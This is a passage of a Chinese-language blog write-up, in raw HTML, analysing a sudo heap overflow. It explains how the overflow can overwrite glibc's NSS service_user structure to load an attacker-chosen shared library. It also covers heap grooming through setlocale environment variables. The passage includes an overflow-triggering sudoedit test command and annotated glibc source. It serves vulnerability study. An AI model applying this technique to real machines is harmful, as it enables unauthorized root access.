operator">++</span><span class="token punctuation">)</span>        size <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">*</span>av<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span></code></pre><ol start="2"><li>可以控制user_args溢出的内容,注意是与长度同时独立控制.因为环境变量在内存中是紧邻我们的设置的参数的,在反转义操作中可以通过’\‘来使from指针从argv跳到envp,所以我们可以通过参数来控制堆内存长度,用环境变量控制溢出内容.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305211125352.png"><br>测试一下:</li></ol><pre class=" language-sh"><code class="language-sh">env -i 'AA=a\' 'B=b\' 'C=c\' 'D=d\' 'E=e\' 'F=f' sudoedit -s '1234567890123456789012\'</code></pre><p>argv的总长度为0x18字节,堆块大小为0x20字节,<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305211310863.png"><br>反转义操作之后,成功使用环境变量覆盖下一个堆块内容.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305211323836.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305211323471.png"><br>3. 可以向缓冲区内写入空字节(每一个以’\‘结尾的参数都会向缓冲区内写入空字节).</p><h3 id="提权原理分析"><a href="#提权原理分析" class="headerlink" title="提权原理分析"></a>提权原理分析</h3><p>提权是通过堆溢出覆盖nss load library函数加载so的时候需要用到的结构体service user,覆盖此结构体中的so名字符串,这样就可以让程序加载我们指定的so文件,从而完成任意代码执行</p><p>在nss_load_library函数中,如果ni-&gt;library为空,会调用 nss_new_service 对library 初始化，刚初始化的 handle为NULL,便会在第二个if分支进行装载so文件.</p><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span><span class="token function">nss_load_library</span> <span class="token punctuation">(</span>service_user <span class="token operator">*</span>ni<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>ni<span class="token operator">-></span>library <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">static</span> name_database default_table<span class="token punctuation">;</span>      ni<span class="token operator">-></span>library <span class="token operator">=</span> <span class="token function">nss_new_service</span> <span class="token punctuation">(</span>service_table <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token operator">&amp;</span>default_table<span class="token punctuation">,</span>                     ni<span class="token operator">-></span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>ni<span class="token operator">-></span>library <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>ni<span class="token operator">-></span>library<span class="token operator">-></span>lib_handle <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      ··· ···      <span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span>shlib_name<span class="token punctuation">,</span>                          <span class="token string">"libnss_"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    ni<span class="token operator">-></span>name<span class="token punctuation">)</span><span class="token punctuation">,</span>              <span class="token string">".so"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        __nss_shlib_revision<span class="token punctuation">)</span><span class="token punctuation">;</span>      ni<span class="token operator">-></span>library<span class="token operator">-></span>lib_handle <span class="token operator">=</span> <span class="token function">__libc_dlopen</span> <span class="token punctuation">(</span>shlib_name<span class="token punctuation">)</span><span class="token punctuation">;</span>      ··· ···      ··· ···  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>关注几个有关的结构体</p><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> service_user<span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/* And the link to the next entry.  */</span>  <span class="token keyword">struct</span> service_user <span class="token operator">*</span>next<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Action according to result.  */</span>  lookup_actions actions<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Link to the underlying library object.  */</span>  service_library <span class="token operator">*</span>library<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Collection of known functions.  */</span>  <span class="token keyword">void</span> <span class="token operator">*</span>known<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Name of the service (`files', `dns', `nis', ...).  */</span>  <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> service_user<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> name_database_entry<span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/* And the link to the next entry.  */</span>  <span class="token keyword">struct</span> name_database_entry <span class="token operator">*</span>next<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* List of service to be used.  */</span>  service_user <span class="token operator">*</span>service<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Name of the database.  */</span>  <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> name_database_entry<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> name_database<span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/* List of all known databases.  */</span>  name_database_entry <span class="token operator">*</span>entry<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* List of libraries with service implementation.  */</span>  service_library <span class="token operator">*</span>library<span class="token punctuation">;</span><span class="token punctuation">}</span> name_database<span class="token punctuation">;</span></code></pre><p>有一个全局入口 static name_database *service_table;,如果该对象为空,则会调用nss_parse_file进行初始化,打开/etc/nsswitch.conf的nss配置文件(每台主机中的内容可能不同),并在堆上创建对应的数据结构</p><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> name_database <span class="token operator">*</span><span class="token function">nss_parse_file</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>fname<span class="token punctuation">)</span><span class="token punctuation">{</span>  FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>  name_database <span class="token operator">*</span>result<span class="token punctuation">;</span>  name_database_entry <span class="token operator">*</span>last<span class="token punctuation">;</span>  ··· ···  <span class="token comment" spellcheck="true">//打开/etc/nsswitch.conf</span>  fp <span class="token operator">=</span> <span class="token function">fopen</span> <span class="token punctuation">(</span>fname<span class="token punctuation">,</span> <span class="token string">"rce"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  ··· ···  result <span class="token operator">=</span> <span class="token punctuation">(</span>name_database <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span> <span class="token punctuation">(</span>name_database<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  ··· ···  <span class="token keyword">do</span>    <span class="token punctuation">{</span>      name_database_entry <span class="token operator">*</span>this<span class="token punctuation">;</span>      ssize_t n<span class="token punctuation">;</span>      n <span class="token operator">=</span> <span class="token function">__getline</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>line<span class="token punctuation">,</span> <span class="token operator">&amp;</span>len<span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// getline 这里会申请一个0x80 大小的chunk</span>            ··· ···                this <span class="token operator">=</span> <span class="token function">nss_getline</span> <span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>this <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>last <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>        last<span class="token operator">-></span>next <span class="token operator">=</span> this<span class="token punctuation">;</span>      <span class="token keyword">else</span>        result<span class="token operator">-></span>entry <span class="token operator">=</span> this<span class="token punctuation">;</span>      last <span class="token operator">=</span> this<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof_unlocked</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Free the buffer.  */</span>  <span class="token function">free</span> <span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//在函数返回之前会将getline 函数申请的0x80 chunk 释放掉。</span>  <span class="token comment" spellcheck="true">/* Close configuration file.  */</span>  <span class="token function">fclose</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>借用chenaotian师傅的图片,最后形成这样的一个结构.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305211457617.png"></p><p>我们将断点下在溢出点之后的第一次调用nss_load_library函数的地方并运行,查看当前的service_user指针并与service_table链表中对比,发现溢出后第一次调用nss_load_library使用的service_user结构体是”shadow”的那一个,也就是上图结构中对应的第7个堆块.所以我们只需要在保持Service_table链表完整的情况下(不然遍历时会触发段错误),覆盖第7个堆块的name指针为伪造的so文件的文件名,便可装载伪造的so文件进而任意代码执行成功提权.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305211455101.png"></p><h3 id="堆布局"><a href="#堆布局" class="headerlink" title="堆布局"></a>堆布局</h3><p>重复一遍我们的目标</p><blockquote><p>在保持Service_table链表完整的情况下(不然遍历时会触发段错误),覆盖第7个堆块的name指针为伪造的so文件的文件名</p></blockquote><p>要完成这个目标,最理想的情况下是vuln_chunk(即溢出点user_args的堆内存)能分配到堆块5和堆块7(target_chunk)之间的空间.<br>(其中0xX0指的是不会在vuln_chunk申请之前消耗掉的某种大小的chunk,chenaotian师傅使用的是0xa0)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305211617074.png"><br>要完成这样的布局,通过setlocate函数来实现.</p><h4 id="可控大小的堆块分配释放"><a href="#可控大小的堆块分配释放" class="headerlink" title="可控大小的堆块分配释放"></a>可控大小的堆块分配释放</h4><p>setlocate函数是用来根据环境变量来设置语言环境的.<br>相关的环境变量有这几种</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> __LC_CTYPE 0</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_NUMERIC 1</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_TIME 2</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_COLLATE 3</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_MONETARY 4</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_MESSAGES 5</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_ALL 6</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_PAPER 7</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_NAME 8</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_ADDRESS 9</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_TELEPHONE10</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_MEASUREMENT11</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_IDENTIFICATION12</span></code></pre><p>sudo使用的是setlocale(LC_ALL, “”).<br>现在来看一下setlocate的实现.(仅分析要用到的LC_ALL分支)<br>当category==LC_ALL时,进入一个循环,对LC_ALL之前的每个category调用函数 _nl_find_locale,从环境变量列表中取出category对应的环境变量的值.若返回NULL则跳出循环.<br>堆布局的关键在于:<br>调用strdup函数将栈上的环境变量的值字符串拷贝到堆上.<br>并在最后校验失败时释放掉strdup分配的堆块.<br>于是我们便可以通过对应的相关环境变量制造特定大小的放入Tcache中的堆块.</p><pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">setlocale</span> <span class="token punctuation">(</span><span class="token keyword">int</span> category<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>locale<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>locale_path<span class="token punctuation">;</span>  size_t locale_path_len<span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>locpath_var<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>composite<span class="token punctuation">;</span>  ··· ···        locale_path <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  locale_path_len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  ··· ···  <span class="token keyword">if</span> <span class="token punctuation">(</span>category <span class="token operator">==</span> LC_ALL<span class="token punctuation">)</span>    <span class="token punctuation">{</span>      ··· ···      ··· ···      <span class="token comment" spellcheck="true">/* Load the new data for each category.  */</span>          <span class="token keyword">while</span> <span class="token punctuation">(</span>category<span class="token operator">--</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>category <span class="token operator">!=</span> LC_ALL<span class="token punctuation">)</span>      <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//关键处理函数 _nl_find_locale</span>        newdata<span class="token punctuation">[</span>category<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">_nl_find_locale</span> <span class="token punctuation">(</span>locale_path<span class="token punctuation">,</span> locale_path_len<span class="token punctuation">,</span>                         category<span class="token punctuation">,</span>                         <span class="token operator">&amp;</span>newnames<span class="token punctuation">[</span>category<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>newdata<span class="token punctuation">[</span>category<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//返回null 则会跳出循环</span>        ···        <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>        ··· ···        <span class="token comment" spellcheck="true">/* Make a copy of locale name.  */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>newnames<span class="token punctuation">[</span>category<span class="token punctuation">]</span> <span class="token operator">!=</span> _nl_C_name<span class="token punctuation">)</span>          <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span> <span class="token punctuation">(</span>newnames<span class="token punctuation">[</span>category<span class="token punctuation">]</span><span class="token punctuation">,</span>                _nl_global_locale<span class="token punctuation">.</span>__names<span class="token punctuation">[</span>category<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>          newnames<span class="token punctuation">[</span>category<span class="token punctuation">]</span> <span class="token operator">=</span> _nl_global_locale<span class="token punctuation">.</span>__names<span class="token punctuation">[</span>category<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>          <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//调用strdup函数将栈上的环境变量字符串拷贝到堆上.</span>            newnames<span class="token punctuation">[</span>category<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">__strdup</span> <span class="token punctuation">(</span>newnames<span class="token punctuation">[</span>category<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>newnames<span class="token punctuation">[</span>category<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>              <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">/* Create new composite name.  */</span>      composite <span class="token operator">=</span> <span class="token punctuation">(</span>category <span class="token operator">>=</span> <span class="token number">0</span>           <span class="token operator">?</span> <span class="token constant">NULL</span> <span class="token punctuation">:</span> <span class="token function">new_composite_name</span> <span class="token punctuation">(</span>LC_ALL<span class="token punctuation">,</span> newnames<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>composite <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        ··· ···    <span class="token punctuation">}</span>      <span class="token keyword">else</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token operator">++</span>category<span class="token punctuation">;</span> category <span class="token operator">&lt;</span> __LC_LAST<span class="token punctuation">;</span> <span class="token operator">++</span>category<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//校验</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>category <span class="token operator">!=</span> LC_ALL <span class="token operator">&amp;&amp;</span> newnames<span class="token punctuation">[</span>category<span class="token punctuation">]</span> <span class="token operator">!=</span> _nl_C_name          <span class="token operator">&amp;&amp;</span> newnames<span class="token punctuation">[</span>category<span class="token punctuation">]</span> <span class="token operator">!=</span> _nl_global_locale<span class="token punctuation">.</span>__names<span class="token punctuation">[</span>category<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">//和全局变量默认值进行校验,不通过则释放掉刚刚strdup分配的内存.</span>        <span class="token function">free</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> newnames<span class="token punctuation">[</span>category<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">/* Critical section left.  */</span>      <span class="token function">__libc_rwlock_unlock</span> <span class="token punctuation">(</span>__libc_setlocale_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">/* Free the resources.  */</span>      <span class="token function">free</span> <span class="token punctuation">(</span>locale_path<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">free</span> <span class="token punctuation">(</span>locale_copy<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> composite<span class="token punctuation">;</span>    <span class="token punctuation">}</span>        ··· ···    ··· ···      <span class="token punctuation">}</span><span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>setlocale<span class="token punctuation">)</span></code></pre><h4 id="另一处大小可控的堆块分配与释放"><a href="#另一处大小可控的堆块分配与释放" class="headerlink" title="另一处大小可控的堆块分配与释放"></a>另一处大小可控的堆块分配与释放</h4><p>在chenaotian师傅的容器环境中不需要利用这一机制,不过还是粗略分析一下.<br>对于_nl_find_locale函数,关键部分在其中调用的_nl_make_l10nflist函数.参数中需要关注的地方是mask._nl_find_locale函数根据获取到的环境变量的值设置mask.<br>设置格式如下:</p><pre class=" language-c"><code class="language-c">  <span class="token operator">/</span><span class="token operator">*</span> language<span class="token punctuation">[</span>_territory<span class="token punctuation">[</span><span class="token punctuation">.</span>codeset<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>@modifier<span class="token punctuation">]</span>     根据环境变量的值来进行mask 设置，关键字为<span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'@'</span> 设置<span class="token number">4</span>个标志位<span class="token punctuation">(</span>mask<span class="token punctuation">)</span>     _ 代表国家，会设置一个标志位     <span class="token punctuation">.</span> 代表语言编码之类的，有大小写两种写法<span class="token punctuation">(</span>如UTF<span class="token number">-8</span>和utf8<span class="token punctuation">)</span>，设置两个标志位     @ 代表用户添加的后缀，也就是自定义内容，设置一个标志位</code></pre><p>_nl_make_l10nflist函数根据mask生成本次操作的文件路径.生成的文件路径格式如下,其中dir(/usr/lib/locale)、language(C)、filename(环境变量名)都是固定的.</p><pre class=" language-c"><code class="language-c">dir<span class="token operator">+</span>language<span class="token operator">+</span><span class="token punctuation">[</span>_territory<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">.</span>codeset<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">.</span>normalized_codeset<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span>@modifier<span class="token punctuation">]</span><span class="token operator">+</span>filename</code></pre><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> loaded_l10nfile <span class="token operator">*</span><span class="token function">_nl_make_l10nflist</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> loaded_l10nfile <span class="token operator">*</span><span class="token operator">*</span>l10nfile_list<span class="token punctuation">,</span>            <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>dirlist<span class="token punctuation">,</span> size_t dirlist_len<span class="token punctuation">,</span>            <span class="token keyword">int</span> mask<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>language<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>territory<span class="token punctuation">,</span>            <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>codeset<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>normalized_codeset<span class="token punctuation">,</span>            <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>modifier<span class="token punctuation">,</span>            <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>filename<span class="token punctuation">,</span> <span class="token keyword">int</span> do_allocate<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>abs_filename<span class="token punctuation">;</span>  <span class="token keyword">struct</span> loaded_l10nfile <span class="token operator">*</span>last <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token keyword">struct</span> loaded_l10nfile <span class="token operator">*</span>retval<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>cp<span class="token punctuation">;</span>  size_t entries<span class="token punctuation">;</span>  <span class="token keyword">int</span> cnt<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Allocate room for the full file name.  */</span>  <span class="token comment" spellcheck="true">//为根据mask 的值和从环境变量中提取出的值组成的不同的文件路径分配堆内存,此处便是我们可以控制堆块大小的点.</span>  abs_filename <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span> <span class="token punctuation">(</span>dirlist_len                  <span class="token operator">+</span> <span class="token function">strlen</span> <span class="token punctuation">(</span>language<span class="token punctuation">)</span>                  <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mask <span class="token operator">&amp;</span> XPG_TERRITORY<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span>                     <span class="token operator">?</span> <span class="token function">strlen</span> <span class="token punctuation">(</span>territory<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">)</span>                  <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mask <span class="token operator">&amp;</span> XPG_CODESET<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span>                     <span class="token operator">?</span> <span class="token function">strlen</span> <span class="token punctuation">(</span>codeset<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">)</span>                  <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mask <span class="token operator">&amp;</span> XPG_NORM_CODESET<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span>                     <span class="token operator">?</span> <span class="token function">strlen</span> <span class="token punctuation">(</span>normalized_codeset<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">)</span>                  <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mask <span class="token operator">&amp;</span> XPG_MODIFIER<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span>                     <span class="token operator">?</span> <span class="token function">strlen</span> <span class="token punctuation">(</span>modifier<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">)</span>                  <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token function">strlen</span> <span class="token punctuation">(</span>filename<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>abs_filename <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  retval <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  last <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Construct file name.  */</span>  <span class="token comment" spellcheck="true">//根据文件名，也就是mask决定的内容进行拼接文件名</span>  <span class="token function">memcpy</span> <span class="token punctuation">(</span>abs_filename<span class="token punctuation">,</span> dirlist<span class="token punctuation">,</span> dirlist_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__argz_stringify</span> <span class="token punctuation">(</span>abs_filename<span class="token punctuation">,</span> dirlist_len<span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  cp <span class="token operator">=</span> abs_filename <span class="token operator">+</span> <span class="token punctuation">(</span>dirlist_len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span>cp<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">;</span>  cp <span class="token operator">=</span> <span class="token function">stpcpy</span> <span class="token punctuation">(</span>cp<span class="token punctuation">,</span> language<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mask <span class="token operator">&amp;</span> XPG_TERRITORY<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token operator">*</span>cp<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">'_'</span><span class="token punctuation">;</span>      cp <span class="token operator">=</span> <span class="token function">stpcpy</span> <span class="token punctuation">(</span>cp<span class="token punctuation">,</span> territory<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mask <span class="token operator">&amp;</span> XPG_CODESET<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token operator">*</span>cp<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">;</span>      cp <span class="token operator">=</span> <span class="token function">stpcpy</span> <span class="token punctuation">(</span>cp<span class="token punctuation">,</span> codeset<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mask <span class="token operator">&amp;</span> XPG_NORM_CODESET<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token operator">*</span>cp<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">;</span>      cp <span class="token operator">=</span> <span class="token function">stpcpy</span> <span class="token punctuation">(</span>cp<span class="token punctuation">,</span> normalized_codeset<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mask <span class="token operator">&amp;</span> XPG_MODIFIER<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token operator">*</span>cp<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">'@'</span><span class="token punctuation">;</span>      cp <span class="token operator">=</span> <span class="token function">stpcpy</span> <span class="token punctuation">(</span>cp<span class="token punctuation">,</span> modifier<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token operator">*</span>cp<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">;</span>  <span class="token function">stpcpy</span> <span class="token punctuation">(</span>cp<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">;</span>  ··· ···  <span class="token comment" spellcheck="true">//如果已经已经存在同名文件，则释放刚申请的chunk</span>  <span class="token comment" spellcheck="true">//同名文件的产生原因是设置环境变量时缺省了某些值,所以无论mask中对应位的值为1还是0,生成的文件路径都相同.</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>retval <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token 